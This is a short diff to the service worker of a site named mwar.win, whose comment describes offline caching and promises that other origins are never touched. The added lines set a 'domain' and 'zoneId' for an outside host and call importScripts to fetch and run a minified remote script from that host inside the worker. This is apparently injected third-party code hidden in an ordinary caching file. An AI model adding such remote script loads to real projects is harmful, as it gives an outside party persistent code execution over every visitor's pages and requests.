@@ -1,3 +1,10 @@
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 12348305
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
 /* mwar.win service worker — installable PWA + faster repeat visits.
  *  - /api/* and other origins: never touched (always live, auth headers untouched)
  *  - immutable build assets, fonts, /brand, /vendor: cache-first
